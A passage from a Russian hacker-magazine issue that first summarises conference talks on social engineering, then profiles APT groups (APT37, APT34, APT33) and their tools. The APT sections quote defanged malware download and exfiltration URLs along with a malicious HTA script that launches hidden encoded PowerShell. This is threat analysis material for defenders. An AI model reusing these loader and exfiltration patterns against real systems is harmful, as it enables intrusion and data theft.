 тему — это не уязвимости в соф те, а халатность сотрудни‐
  ков. Вос пользоваться ей помогает социальная инженерия,
  узнать о пос ледних веяниях в которой ты можешь из работ
 исследователей. Чтобы помочь тебе быть в курсе, мы соб‐
 рали подборку из девяти наибо лее занимательных докладов
 за последнее время.


 КАК МОТИВИРОВАТЬ ПЕРСОНАЛ НА ВНИМАТЕЛЬНОСТЬ К
 КИБЕРБЕЗОПАСНОСТИ
 Masha Sedova. Surfing the Motivation Wave to Create Security Be-
  havior Change // Enigma. 2018
    На протяже нии десятилетий корпоративные тренинги по инфобезопас‐
  ности, направленные на повышение осведомленности, были призваны
  решить одну‐единственную задачу: раз вить у персонала компетенции, необ‐
  ходимые для поддержания корпоративной кибербезопасности. Предполага‐
  лось, что сотрудники не знают, как пра виль но вести себя, и что при достаточ‐
  ном количестве тренин гов они ста нут вести себя более безопас но.
    Однако, как показала практика, чтобы обеспечить кибербезопасность,
  нужно в первую очередь решить другую, более насущную задачу: мотиви‐
  ровать сотрудников относиться к кибербезопас ности внимательнее! Тому,
  как это сделать, и посвящен данный доклад.





 ЛЖЕНАУКА ПРОТИВ КИБЕРБЕЗОПАСНИКОВ
  Josiah Dykstra, PhD. She Blinded Me with Science: Understanding
  Misleading,  Manipulative, and Deceptive  Cybersecurity  // LASER
  Workshop. 2017
    Хорошо, когда повседневные задачи кибербезопасности решаются с опо‐
  рой на научные изыскания, одна ко далеко не все из тех пре тензий на науч‐
  ность, которые мы слышим из новос тей или от пос тавщиков‐кибербезопас‐
  ников, имеют под собой авторитетную основу. Людей, подыскивающих
  для себя решения и продукты безопас ности, ежедневно вводят в заблужде‐
  ние, манипулируют их мнением, обманывают — реальными и фиктивными
  исследованиями, громкими заявлениями и маркетинговыми уловками. Едва
  ли одна треть населе ния сможет адекватно объяснить, что значит «изучать
  что‐то по‐научному». Одна ко на научность претендуют все.
    Докладчик рассматривает опасность заказ ных иссле дований, опросов
  и логических рассуждений, спонсируемых заинтересованными лицами. Рас‐
  сказывает, как псевдоученые, занимающиеся «научными» исследованиями,
  налаживают контакт с практику ющими кибербезопас никами, ослепляя их
  правдоподобными графика ми и дру гими, с поз воления сказать, научными
  выкладками. Маркетинговый успех всех этих псевдонаучных ухищ рений объ‐
  ясняется тем, что человеческий ум несовершенен, склонен впадать в иллю‐
  зию, а наше восприятие может нас обманывать. Именно на этих уязвимостях
  нашего ума и паразитируют псевдоученые.





 КАК ОГРАБИТЬ БАНК ЧЕРЕЗ ТЕЛЕФОН: ЛИЧНЫЙ ОПЫТ И
 ДЕМОНСТРАЦИОННОЕ АУДИО
  Joshua Crumbaugh. How to Rob a Bank Over the Phone – Lessons
  Learned and Real Audio from an Actual Social Enfineering Engage-
  ment // Black Hat. 2017
    Презентация наполо вину состоит из демонстрации аудиозаписи реаль‐
  ного акта социальной инженерии. В коммента риях докладчик делится своим
  опытом. На  этой  аудиозаписи  докладчик  разговаривает  по  телефону
  с вице‐президентом банка, и тот за время беседы пре доставил полный дос‐
  туп к своему компьютеру. Практику ющие социаль ные инженеры, а также
  кибербезопасники, которые хотят узнать, как распознавать атаки социальной
  инженерии, извлекут из раз говора много ценных уроков.


 ГРАБИТЕЛЬ БАНКОВ И ПРЕДПРИЯТИЙ ПРЕДЛАГАЕТ СТРАТЕГИИ ИХ
 ЗАЩИТЫ
  Jayson Street. Strategies on securing your banks & enterprises (from
 someone who robs banks & enterprises) // ROOTCON. 2017
   Лю ди, которые работают на обо ронительной стороне кибербезопас ности,
  обычно видят проблему только со своей колокольни. В этой презентации док‐
  ладчик проливает свет на проблему с противоположной стороны: рас ска‐
  зывает, как на ваш сайт и ваших сотрудников смот рит злоумышленник и как
  затем использует эти наблюдения против вас. В начале доклада автор объ‐
  ясняет, как создать успешное фишинг‐копье, используя информацию, соб‐
  ранную с вкладки «О компании» на корпоративном сайте, а также со стра‐
  ничек в соцсетях (для пос леду ющих социальных атак на сотрудников).
    Доклад в основном пос вящен тому, какие контрмеры предпринимать и как
  атаки социальной инженерии обна руживать, на примерах из личного опы та
  докладчика. А личный опыт у докладчика немаленький: пятнадцать лет работы
  на стороне обороны в банковской сфере и шесть лет работы в «крас ной
  команде» кибербезопас ности (в качестве этичного хакера).





 ЭКСПЛОИТЫ В МОЗГАХ (ЧЕЛОВЕЧЕСКИХ)
  Rober Sell. Exploits in Wetware // DEF CON. 2017
    Докладчик делится своим опытом неоднократ ного участия в DEF CON CTF,
  демонстрируя, насколько легко добыть конфиденциальную информацию
  из любой организации. Докладчик отмечает, что отчет Verizon за 2017 год
  фиксирует резкие темпы роста атак соци альной инженерии. Далее расска‐
  зывает, как добыл сотни «точек данных» целевой организации, применяя
  методы OSINT (разведка по открытым источни кам). Затем докладчик опи‐
  сывает победоносную стра тегию, которую реализовал, чтобы максимизи‐
  ровать отдачу от соб ранных «точек данных», — на живом примере, в 20‐
  минутной аудиозаписи.
    Без особых усилий докладчик смог добыть у своей жертвы информацию
  о VPN, ОС, об уровне патчей, номера мобильников топ‐менеджеров и места
  их жительства. Также докладчик делится, под какими предлогами можно
  обращаться в организа цию и какую эмо цию в каждый из предлогов вкла‐
  дывать. Зна ние этих поведенческих шаб лонов поможет обу чить сотрудников
  противостоять социальной инженерии. Для боль шей мотивации к тому, чтобы
  директора обучали сво их сотрудников навыкам противостояния социальной
  инженерии, докладчик поднимает следующие мотива ционные вопросы.
   • «Как вы думаете, если социальный инженер обла дает той информацией,
     которая в данном докладе представлена, — сколько времени ему пот‐
    ребуется, чтобы убедить вашего финансового директора сделать банков‐
     ский перевод?»
   • «Как думаете, вы застра хованы от социальной инженерии?»
   • «Если ваша организа ция потеря ла нес колько миллионов дол ларов из‐за
    социальной инженерии, кто в этом виноват? Кого уволят?»

  Докладчик завершает свое повествование серией стратегий, которые ком‐
  пании могут предпринять, чтобы снизить вероятность того, что их сотрудни ки
  станут жертвами социального инженера.





 ПОДРОБНО О КОМПРОМЕТАЦИИ КОРПОРАТИВНОЙ ЭЛЕКТРОННОЙ
 ПОЧТЫ
  Keith Turpin. Phishing for Funds: Understanding Business Email Com-
  promise // Black Hat. 2017
    Такая разновидность фишинговой ата ки, как компрометация корпоратив‐
  ной электронной поч ты (также известная как атака лже‐CEO), — это быстро
  развивающийся вид кибермошенничества, популярность которого особенно
  резко подскочила с 2015 на 2016 год — на 1300% (все нули настоящие,
  это не опечатка). Киберпрес тупники, пользуясь этой схемой, нацеливаются
  на самые разнооб разные организации, вне зависимости от того, в каком сег‐
  менте рынка они работают и какой у них раз мер. В 2017 году тысячи орга‐
  низаций из ста с лишним стран отчи тались об убытках, связанных с этим
  видом мошенничества. Только по официальным данным общая сумма финан‐
  совых потерь составила три миллиарда долларов. Однако разумным будет
  предположить, что фактичес кие убытки зна чительно больше.
     Как правило, компромета ция корпоративной электронной почты представ‐
  ляет собой целенаправленную атаку, которая начинается с кропотливой раз‐
  ведки. Атакующие не жалеют времени и сил на то, что бы лучше понять людей
  и бизнес‐процессы целевой орга низации. Такие целенаправленные атаки,
  как правило, успешно минуют заслон спам‐филь тров и по виду ничем
  не отличаются от закон ной корреспонденции. В докладе рас смотрены трюки,
  которыми пользуются зло умышленники, в том чис ле подмена адре са отпра‐
  вителя, подделка домена электронной почты, компрометация учетной записи,
  и способы защиты от этих трю ков.
    По мнению докладчика, чтобы ата ка лже‐CEO увенчалась успехом, кибер‐
  преступнику надо ском прометировать элементы управле ния безопасностью,
  связанные с людьми, процессами и технологи ями. Причем сразу все три эти
  элемента. Поэтому если в корпоративной кибербезопасности хотя бы один
  из этих элементов находится под надежной защитой, то вероятность атаки
  лже‐CEO значительно снижается. Для усиления защиты кибербезопасники
  могут развернуть технический контроль в отношении персонала, чтобы бло‐
  кировать определен ные типы мошенничес ких писем, которые до них доходят;
  создать надежные бизнес‐процес сы (которые пресекают мошенническую
  активность); повысить осведомленность пользователей (благодаря чему те
  станут понимать, когда бить тревогу). Тогда, если фишинговое письмо
  все‐таки придет (а оно рано или поздно обязательно при дет), понимание,
  как на него реагировать, существенно снизит количество фишинговых кам‐
  паний, увенчавшихся успехом.





 МОЯ СОБАКА — ХАКЕР, И ОНА УКРАДЕТ ВАШИ ДАННЫЕ!
  Rafael Fontes Souza. My dog is a hacker and will steal your data! //
  ToorCon. 2017
    В этом докладе описан творческий подход к соци альной инженерии, вдох‐
  новленный популярным выс казыванием «Собака — друг человека» (под‐
  разумевается, что с ней мы чувству ем себя лучше и безопасней). Докладчик
  привлекает собаку в качес тве инструмента кибератак. Она носит мобильник,
  спрятанный под нагрудным ремнем. А этот мобильник в автоматическом
  режиме ведет кибератаки на мобильные устройства людей, которые ока‐
  зались поблизости от собаки.
    Здесь подойдут атаки, которые выполняются авто матически, без взаимо‐
  действия с человеком. В их число вхо дят ата ки близ кого радиуса действия,
  такие как поддельные точки дос тупа  Wi‐Fi, поддельные сотовые вышки,
  локальные атаки на пользователя в сети, захват DNS, пакетная инъекция,
  «злой двойник» и много других вариаций. Ты можешь отправить свою хакер‐
  скую собаку гулять по парку, а сам будешь прос то сто ять в сторонке, пока она
  ломает людей для тебя.





 ИХТИОЛОГИЯ: ФИШИНГ КАК НАУКА
  Karla Burnett. Ichthyology: Phishing as a Science // Black Hat. 2017
    Уже практически все согласны с тем, что фишинг непреодолим. Лучшее,
  что мы можем сделать, — запустить образователь ную программу для сот‐
  рудников и скрестить пальцы на удачу. Но дей стви тель но ли фишинг‐тре нинги
  дают нужный эффект? В этом докладе рас смот рена психология фишинга
  и описана серия реальных атак, приведены коэффициенты конверсии. Также
  докладчик демонстрирует способы, при помощи которых были обойдены
  существующие средства корпоративной защиты. Рас смотрены недавние тех‐
  нологические достижения в этой области и описаны способы, как можно
  смягчить воздействие фишинга.


 СОЦИАЛЬНАЯ КИБЕРБЕЗОПАСНОСТЬ: СДВИГ В СТОРОНУ
 ПОНИМАНИЯ СТЕРЕОТИПОВ
  Sauvik Das. Social Cybersecurity: Reshaping Security through an Em-
  pirical Understanding of Human Social Behavior // Enigma. 2018
    Способны ли мы раз рабатывать системы, которые будут поощ рять пра‐
  вильное поведение в плане кибербезопас ности? Несмотря на доступность
  перспективных инструментов обеспечения кибербезопас ности и изобилие
  действительно полезных рекомендаций по их эффективному использованию,
  многие из них остаются невос требованными. Докладчик утверждает, что
  такое расхожде ние теории с практикой воз ника ет из‐за того, что кибер‐
  безопасники, предлагая свои решения, учи тывают только техничес кую сто‐
  рону вопроса и не заботятся о формировании у своих потенциальных поль‐
  зователей  полезных  стереотипов,  не социализируют  свои  технологии.
 И пользовате ли сами додумывают предназначение  этих защитных  тех‐
  нологий.
     Как известно, праздный ум — куз ница дьявола. Поэтому, например, двух‐
  факторную авторизацию расценивают как  акт параноидальности. Шиф‐
  рование телефона — как желание скрытничать. А в более общем плане счи‐
  тают, что, если ты «чрез мерно» заботишься о кибербезопасности, можешь
  показаться подозрительной личностью. В этой презентации докладчик пред‐
  ставляет доказательства следующему утверждению: «Общественное мне ние
  сильно  влияет  на  поведенческие  стереотипы  в  кибербезопасности,
  и хорошие стереотипы кибербезопасности воз ника ют, только если при раз‐
  работке систем кибербезопас ности и сопутс твующих рекомендаций уделяет‐
  ся серьезное внимание их социализации».
    Докладчик подкрепляет это свое утверждение результатами крупномас‐
  штабного иссле дования социальной активнос ти полутора миллионов поль‐
  зователей фейсбука. По итогам этого исследования докладчик разработал
  уведомление для пользователей фейсбука, которое сообщает им, что их
  друзья используют допол нитель ные сис темы безопасности для защиты своих
  учетных записей, и протес тировал его в раз ных вариациях на 50 тысячах
  пользователей фейсбука.
    Вывод, к которо му пришел докладчик: «Стереотипы кибербезопасности
  очень зависят от социаль ного влияния; дизайн сис темы безопасности сильно
  влияет на ее потенциал для социального признания. В частности, сис темы
  безопасности, действия которых наблюдаемы, комплексны, понятны и под‐
  контрольны, находят положитель ный социальный отклик. Тогда как те сис‐
  темы безопасности, которые этими качества ми не обладают, игнориру ются».
  Основываясь на своих исследова ниях и промежу точных выводах, докладчик
  делает такой основной вывод: «Будущее социально‐интеллектуальных систем
  безопасности за теми, кто понимает и учитывает базовые человеческие сте‐
  реотипы, желания и наклоннос ти».
ВЗЛОМ

 WTF IS
APT

ПРОДВИНУТЫЕ АТАКИ,
ХИТРОСТИ
И МЕТОДЫ ЗАЩИТЫ





                                                                     Андрей Васильков
                                                                                    редактор, фронемофил, гик,
                                                                                                                    к. м. н. и т. п.
                                                                                     angstroem@hotbox.ru





Наверняка  ты  читал  о  масштабных  сетевых  атаках,
от которых пострадали бан ки, круп ные предприятия, госуч‐
реждения и даже воен ные объекты. Кто их проводит? Почему
они оказываются столь разрушительными? Можно ли от них
защититься? На эти вопросы мы постараемся ответить
в этой статье.


ПОЯВЛЕНИЕ И ЭВОЛЮЦИЯ APT
Примерно с 2004 года команда реагирова ния на компьютерные инциденты
в Lockheed Martin (LM‐CIRT) стала использовать термин APT (Advanced Persis‐
tent Threat) в своих исследованиях. Так ста ли называть сложные атаки, выпол‐
няемые преимущественно на ИТ‐инфраструктуру военных и государственных
объектов. Как правило, в их проведении подоз ревали спецслужбы других
стран и отряды «правительственных хакеров». Затем с легкой руки журналис‐
тов понятие APT расширилось до мно гоуровневых атак, целью которых может
быть сеть любой организации или группа устройств с общими признаками.
Даже сейчас термин APT оста ется неоднозначным. Его переводят как «раз‐
витая устойчивая угроза» или «слож ная постоянная угроза», подразумевая то
многоэтапный сценарий ата ки, то используемые в ней инструменты, а то
и вовсе мощные хакерские группы.
  В Sophos тоже отмечают, что до сих пор нет еди ных критериев, позволя‐
ющих относить ту или иную атаку именно к APT. Успешные целенаправленные
атаки зачастую выполняются с использованием ста рых наборов экс плоитов,
поэтому 0day‐уязвимости — не обязательный атрибут APT.
  Другой часто выделяемый критерий APT — рас сылка фишинговых писем
для компрометации учет ной записи рядового сотрудника компании. Затем
она используется как точка входа в локальную сеть и плацдарм для перехода
на следующий уровень — к компь ютерам руководителей и серверам ком‐
пании. Однако методы социального инжиниринга и так сверхпопулярны,
поэтому было бы странно выделять их как маркер «сложной постоянной угро‐
зы». На что же стоит ориентироваться?


ПРИЗНАКИ APT
Анализируя отчеты разных специалистов по безопасности, я сформулировал
для себя следующие критерии APT (буду рад, если ты уточнишь и допол нишь
их в комментариях):
 • это всегда целенаправленная атака. Целью обычно выступает не конкрет‐
  ный человек или организация, а какой‐то более общий сегмент (нап‐
   ример, финан совые учреждения) или одно родная группа людей (пос‐
   тояльцы отеля, болельщики на стадионе, пассажиры круизного лайнера);
 • это долговре менная атака. Она может длить ся не один месяц и продол‐
   жаться до победного кон ца или утра ты целесообразнос ти;
 • это хорошо финансируемая ата ка. Даже банальный DDoS — затратная
   процедура, если продолжается длительное время;
 • это многостадийная атака. В APT последователь но используется нес коль‐
   ко векторов и разных техник. Сами по себе они могут быть примитивны,
   интересно именно их сочета ние. Например, секретарше шлют фишин‐
   говые письма, чтобы скомпрометировать ее корпоративную учетку и через
   нее (как от доверенного лица) отпра вить зараженный документ на ноутбук
  шефа;
 • APT не останавливают отдельные инстру менты безопас ности (антивирус,
  файрвол, спам‐фильтры, простые SIEM‐системы), и она долго может оста‐
   ваться незамеченной либо про текать под мас кой отдельных типовых инци‐
   дентов. Важнее то, что ано мальное поведение сети или отдельных устрой‐
   ств сохраняется, хотя при рутинных проверках ничего подоз рительного
   не находится;
 • в ходе APT часто (но не обязательно) используют продвинутые техники,
   эффективно маскиру ющие их компоненты от типовых систем защиты. Нап‐
   ример, reverse shell для обхода МСЭ.

По данным Sophos, в APT исполь зуют ся следующие техники (перечислены
в порядке убывания частоты применения): фишинг и социальный инжиниринг,
DDoS и ботнеты, уязвимости нулевого дня и использующие их продвинутые
зловреды, традиционные зловреды, скомпрометированные устройства, атаки
инсайдеров, атаки уровня приложений.


ЭТАПЫ APT
В любой атаке уровня APT можно выделить семь ключевых этапов (иногда
сокращают до пяти, объединяя шаги):
 1. Пассивный сбор информа ции (идентифика ция и отбор целей из открытых
   источников).
 2. Первичное заражение (заманивание на фишинговые сайты, рассылка
  инфицированных документов).
 3. Доставка боевой нагрузки (drive‐by‐загрузки, использование уязвимостей
   в браузере и его пла гинах).
 4. Активная фаза (повышение привилегий и обход защитных сис тем с целью
   получения допол нительных данных о системе и  закрепле ния в ней
   основных вредоносных компонентов).
 5. Получение  удаленного  контро ля  (внедрение  бэкдоров,  кейлоггеров
   и установка обратных шеллов).
 6. Связь с управляющими серверами в ожидании дальнейших команд (обход
  файрволов, исполь зование для переда чи команд различных мессендже‐
   ров, клиентов соц сетей и популярных сетевых API).
 7. Достижение  конечной цели  (кража данных, выпол нение  незаконных
  финансовых  транзакций, формирование  ботнета,  перехват  контроля
   над АСУ ТП и так далее).


Зло дей зиродей
Эффективность APT‐атак существенно возрастает, когда используются уяз‐
вимости, для которых еще нет пат ча. К примеру, по данным специалис тов
компании 360 Core  Security, в одной из недавних атак группа APT‐C‐
06 использовала 0day‐экспло ит CVE‐2018‐8174 для движка VBScript. Он зат‐
рагивает Internet Explorer в Windows 7–10 и серверных платформах любой
разрядности, начиная с Windows Server 2012 R2.
   Когда открывают фишинговую ссылку или документ MS Oﬃce c вредонос‐
ным элементом управления ActiveX, происходит сбой в работе VBScript,
в результате чего подменяется тип объектов в памяти и права дос тупа к ним.
Так у атакующего появляет ся возможность удаленно выполнить произволь‐
ный код в обход существующих систем защиты. Дополнительно APT‐C‐
06 использовала одну из популярных техник об хода UAC. Подробный анализ
CVE‐2018‐8174 читай здесь.
  Другая  группа,  APT37   (Reaper),  использовала  в  своих  атаках
начала 2018 года эксплоит для уязвимос ти нулевого дня в Adobe Flash Player
CVE‐2018‐4878. Она затрагивает версии до 28.0.0.161 и связана с некоррек‐
тной обработкой указателя в SDK Primetime. Успешная атака приводит
к выполнению произвольного кода через подмену объ ектов в памяти процес‐
са флеш‐проигрывателя.



СОВРЕМЕННЫЕ APT
Глобальная иссле довательская и аналитичес кая группа «Лаборатории Кас‐
перского» (GReAT) подготовила свежий отчет APT Trends Report Q2 2018.
Основные выводы из него я бы сформулиро вал так:
 • сейчас APT‐группировки наращивают свою активность, и по числу атак
  доминируют азиатские;
 • наиболее мощная атака среди недавно зарегис трированных — VPNFilter.
  Вероятно, за ней стоит груп па APT28 (aka Sofacy, Black Energy и еще over
   9000 названий);
 • ранее обнаруженные APT‐группы никуда не исчезли, а период затишья
   не говорит о прекращении их деятельнос ти. Они могут выпол нять неболь‐
  шие операции, которые незамет ны в глобальном масштабе, или же просто
   меняют формат и подбирают инстру менты для новых атак. К при меру,
   вновь пробудилась группа APT27 (также известная как Emissary Panda
   и LuckyMouse);
 • общие компоненты, используемые в сетевых атаках разных APT‐групп,
   позволяют утверждать о тесных вза имос вязях между ними. Например,
   ScarCruft и Darkhotel в своих ата ках применяли один и тот же сайт для рас‐
   пространения эксплоитов, один из которых был 0day;
 • прослеживается явная связь между событиями мирового мас штаба (зим‐
   ние Олимпийские игры, переговоры по Северной Корее и саммит в Син‐
   гапуре) и векторами новых атак.

В конце 2017 года IDC Connect и Malwarebytes провели опрос среди руково‐
дителей (CIO, CTO и CSO) 200+ крупных (у 25% из них штат нас читывал свы‐
ше 5000 сотрудников) американских орга низа ций. Они относились к раз ным
отраслям (разработка ПО, строительство, здравоохранение, финансовые
услуги). Из опрошенных 80% утверждали, что за прошлый год их компании
пострадали от APT один или нес колько раз.
  Однако если ты обнаружил признаки сложной постоянной угрозы в своей
сети, то это еще не озна чает, что она и была целью. При spear phishing копья
(особенно азиатские) часто оказываются недостаточно остры ми. Целились
в кого‐то, а зацепили тебя.


APT-ГРУППЫ
Калифорнийская компания FireEye, извес тная как один из пионеров защиты
от 0day‐уязвимостей, не один год наб людала за деятельностью хакерских
группировок,  проводящих  мощ ные  целенаправленные  атаки.  Схожий
«почерк» и общие инстру менты поз волили FireEye выделить следующие клю‐
чевые группы.


APT37
Предположительно команда пра вительственных хакеров из Северной Кореи.
Другие  возможные  наз вания:  Group123,  ScarCruft,  RedEyes. Действует
как минимум с 2012 года и в 2017–2018 годах стала особенно активной. При‐
надлежность к Северной Корее выдают IP‐адреса, временные метки (UTC
+8:30) и выбор зарубеж ных целей, явно отражающий изменения во внешней
политике КНДР.
  Основные цели: государственные и военные учреждения Южной Кореи,
Японии, Китая и Вьетнама. Реже атакуют Индию. Вероятно, пару раз зацепи‐
ли Кувейт, Россию и другие страны, но это похоже на случайность.
   Хакеры APT37 часто атакуют системы SCADA на объ ектах химического
производства, взламывают сети компаний из аэрокосмической отрасли,
собирают персональные данные из баз данных медицинских учреждений.
Пытаются украсть документацию о текущих хай‐тек‐разработках из сети про‐
фильных компаний и связанных с ними универ ситетов.
  За последние годы ата ки APT37 ста ли более изощренными. Если раньше
они использовали в основном методы социального инжи ниринга, то сейчас
в их арсенале появилось специализиро ванное ПО (преимущес твенно бэк‐
доры) и наборы свежих экспло итов, включая 0day.
  Используемые инстру менты:
 • JS‐профайлер RICECURRY, определяющий версию браузера, его плагины
   и настройки для выбора способа дос тавки пейлоада;
 • утилита CORALDECK для скрытой доставки боевой нагрузки в виде
  зашифрованных архивов и обра зов;
 • бэкдор DOGCALL. Умеет перехватывать клавиатурные нажатия, записы‐
   вать скриншоты и использовать API облачных хра нилищ для подключения
   к своим управляющим серверам (C&C);
 • бэкдор KARAE. Действу ет на первом этапе ата ки. Собирает системную
  информацию, после чего может отправлять и скачивать файлы. Также
   использует API облачных сервисов для свя зи с C&C. Распространялся
   через файлооб менные сети под видом приложения для скачивания
   роликов с YouTube;
 • бэкдор SLOWDRIFT также исполь зует облачные API для получения команд
   от своего управляющего сервера. Он про никал на компьютеры жертв
   через таргетированные фишинговые пись ма и использовал эксплоит
   для текстового процес сора Hangul Word Processor, популярного в ака‐
  демических кругах Южной Кореи. Это еще один маркер целенаправлен‐
   ной атаки, посколь ку в других странах формат документов HWPX, мягко
   говоря, непопулярен;
 • бэкдор POORAIM. Основной канал распростра нения — таргетированный
   через взломанные сайты — watering hole. Использует AOL‐мессенджер
   для связи с C&C, что выделяет его среди прочих зловредов;
 • бэкдор WINERACK собирает информа цию об ОС, софте и пользовате ле,
   после чего запускает на атакуемом хосте обратный шелл (Wine cmd.exe)
   для обхода NAT и файрвола;
 • сравнительно новый бэкдор SHUTTERSPEED, использовавший зиродей
   в Microsoft Oﬃce CVE‐2017‐0199. Собирает данные о системе, делает
   скриншоты, по команде заг ружа ет и запускает на исполне ние оче редной
   зловред;
 • троян‐даунлоадер HAPPYWORK. Использовался в 2016 году для атаки
   на финансовые учреждения. По команде заг ружа ет боевую нагрузку, а до
   этого собирает системную информацию и данные пользовате ля. Также
   отслеживает состояние функции IsDebuggerPresent, позволяющей наз‐
   начить в Windows вызов произвольной программы вмес то используемой
   по умолчанию (включая системные компоненты, вроде проводника и дис‐
   петчера процессов);
 • вспомогательные утилиты: SOUNDWAVE для скрытой записи с микрофона,
  RUHAPPY для заметания следов.

Основные техники APT37:
 • spear Phising, или таргетированный фишинг. Отличается от наспех сля пан‐
   ных мошеннических писем для мас совой рассылки убедительным пер‐
   сонализированным текстом, на который с высокой вероятностью «клюнет»
   определенная категория пользователей. Например, деканам южнокорей‐
   ских университетов отправлялись письма о текущих грантах и научных пуб‐
   ликациях с призывом к немедленным дей ствиям (быстрее подтвердить
   участие, отправить заявку, уточнить реквизиты и подобное), чтобы они
   запустили вложение;
 • drive‐by‐загрузки. По ссылке из документа во вложении или с зараженного
   сайта происходит редирект на веб‐страницу со скриптом, использующим
   эксплоит для скрытой загрузки зловредов;
 • запуск скачанной боевой нагрузки путем подмены ассоциаций файловых
   расширений или через уязвимости механизма Microsoft Dynamic Data
   Exchange;
 • использование AOL IM или API Dropbox и pCloud для связи с управляющи‐
  ми серверами ботнета;
 • скачивание боевой нагрузки по команде управляющего сервера и ее
   запуск через уязвимость в DDE или подмену файловых ассоциаций;
 • использование  уязвимостей  в  специфических  продуктах  (например,
   в Hangul — южнокорейском ана логе MS Word);
 • использование уязвимос тей нулевого дня в мас совых продуктах (браузер‐
  ный плагин Adobe Flash).


APT34
Предположительно иранская группировка, с 2014 года атакующая широкий
спектр целей на Среднем Вос токе. Преимущественно занимается хищением
средств  со  счетов  зарубежных  банков  и  промышленным шпионажем
в химической и энергетичес кой отрасли.
  Самая масштабная ата ка с учас тием APT34 зафиксирована специалис‐
тами FireEye в мае 2016 года. Все началось с вол ны фишинговых писем,
содержащих вредоносные приложения, которые были отправлены сразу
в несколько банков. Это были документы MS Excel с макросами, но их все
равно откры ли из‐за правдоподобно выглядящего сопроводительного тек‐
ста. Письма содержали темы сообщений, связанные с ИТ‐инфраструктурой
(например, журнал отчета о статусе сервера или список компонентов Cisco
Iron Port Appliance). В одном случае письмо даже продол жало реальный раз‐
говор по электронной почте между нес колькими сот рудниками и содержало
их валидные контактные данные.
  Макрос  вызывал  функцию  Init(),  которая  извлекала  содержимое
в кодировке Base64 из ячеек листа с заголовком Incompatible (имитация
несовместимой версии документа). Затем он проверял наличие скрипта
по адресу %PUBLIC%\Libraries\update.vbs. Если скрипта не было, то он
начинал его создавать через PowerShell, формируя командлет %PUBLIC%\Li‐
braries\dns.ps1. Затем макрос создавал запланированную задачу с име‐
нем GoogleUpdateTaskMachineUI с вызовом каждые три минуты. Из‐за жестко
заданной переменной %PUBLIC% макрос успешно выполнялся только в Win‐
dows Vista и более ранних версиях, но именно они зачастую и были установ‐
лены на целевых компьютерах. Дополнительно пос ле успешного запуска мак‐
рос отображал контент ранее скрытых ячеек в прис ланном документе (через
функцию ShowHideSheets()), прос то чтобы успокоить пользователя и усы‐
пить его бдительность.
  На следующем этапе скрипт update.vbs использовал PowerShell для заг‐
рузки пейлоада. Он скачивал по обфусцированной ссылке hxxp://go0gIe[.]
com/sysupdate.aspx?req=xxx\dwn&m=d и сохранял в каталог %PUBLIC%\Li‐
braries\dn вредоносные компоненты, главным из которых была модифи‐
цированная утилита Mimikatz для извлечения из оперативной памяти паролей
залогиненных пользователей.
  Затем он скачивал по ссылке hxxp://go0gIe[.]com/sysupdate.aspx?
req=xxx\bat&m=d другой командный файл (.bat), запус кал его и сохранял
результаты работы в соседнем каталоге %PUBLIC%\Libraries\up. Батник
представ лял собой простейший скрипт для сбора информации о пользовате‐
ле и системе. Это был набор стандартных команд вроде whoami, hostname,
ipconfig /all, net user.
  На заключительном этапе соз давался командлет dns.ps1, используемый
для скрытой отправки файлов, а все соб ранные данные отправлялись на сер‐
вер  hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\upl&m=u  методом
HTTP POST.
  В этой атаке интересен метод скры той свя зи с управляющим сервером
через DNS‐запросы. Протокол DNS вряд ли будет заблокирован файрволом,
а его использование обычно не вызывает срабаты вания поведенческих ана‐
лизаторов. В начале работы командлет dns.ps1 зап рашивает через протокол
DNS идентификатор с сервера go0gIe.Com. Затем этот идентификатор сох‐
раняется в сце нарии PowerShell, а на командный сервер отправляется сле‐
дующий запрос для получения дополнительных инс трукций. Если дальнейшие
действия не требуются, то командлет завершает ся и будет активирован
скриптом update.vbs снова через три минуты. Если от C&C‐сервера пришла
серия команд, то командлет начина ет соз давать бат ник по адресу %PUBLIC%\
Libraries\tp\chr(xx)chr(yy).bat.  Конкретные  значения  переменных,
содержимое BAT‐файла и управляющие команды кодируются как окте ты IP‐
адресов. Например, ответ dns.ps1 управляющему серверу отправляется
как  IP‐адрес  с  шаблоном   33.33.xx.yy,  а  получение  им  IP‐адре‐
са 35.35.35.35 означает конец действий.
   Такие нетривиальные подходы всегда вызыва ют интерес специалистов
по безопасности, а группа APT34 получила допол нительную известность
еще и благодаря выполнению «бесфайловой» ата ки. Недавно она исполь‐
зовала уязвимость CVE‐2017‐11882 в Microsoft Oﬃce (2007 SP3 — 2016), поз‐
волявшую обойти антивирусы и прочие файловые анализаторы. При помощи
эксплоита выполнялась инъекция кода в процесс Microsoft Word Equation Edi‐
tor. Таким образом скрытно внедряли пей лоад размером до 17 Кбайт,
не оставляя заметных следов в файловой системе.


APT33
Предположительно еще одна иранская груп па, созданная на базе Nasr Insti‐
tute и действующая с 2013 года. В своих ата ках APT33 использует имеющиеся
в открытом доступе хакерские инструменты, про являя особый интерес
к предприятиям авиационного сектора и энергетичес кой отрасли. Последняя
крупная атака ведется APT33 с мая 2017 года. Она преиму щественно нацеле‐
на на объекты военной авиации в Саудовской Ара вии и южнокорейские неф‐
техимические компании.
  Начало атаки было вполне клас сическим: рассылка фишинговых писем
с тщательно подоб ранными темами и про думанным оформле нием. Для их
составления исполь зовался инс тру мент ALFA TEaM Shell, поз воляющий рас‐
сылать сотни таргетированных писем на основе полуавтоматичес ких шаб‐
лонов. Об одном из подоб ных инс трументов мы уже писали. Использование
ALFA TEaM Shell стало очевидно при ана лизе первой вол ны спам‐рассылки:
некоторые поля в ней содержали дефолтные значения, включая адрес solevis‐
ible@gmail.com. Однако ошибку быс тро испра вили, и уже следующая рас‐
сылка выглядела аккуратно. В тексте ссы лались на реальные вакансии
и высокую зарплату и даже вклю чали заявление о най ме на работу от имени
фиктивной  компании  Equal  Opportunity.  Для  большей  убедительнос ти
APT33 зарегистрировала нес колько доменов, которые выглядят как принад‐
лежащие Boeing, Northrop Grumman, Saudia Aerospace Engineering и дру гим
известным компаниям.
  APT33 отправила сотрудникам ряда компаний зараженные письма с пред‐
ложением работы и со ссылками на вредонос ное HTML‐приложение (.hta).
Файлы .hta часто используются на сайтах служ бы занятости для обработки
запросов о доступных вакансиях. Сюрприз заключал ся во встроенном скрип‐
те (см. фрагмент ниже).


<script>
a=new ActiveXObject("WScript.Shell");
a.run('%windir%\\System32\\cmd.exe /c powershell ‐window hidden ‐enc
<redoctedencoded command>', 0);
</script>

Скрипт загружал бэкдор TURNEDUP, созданный для скры той отправки скрин‐
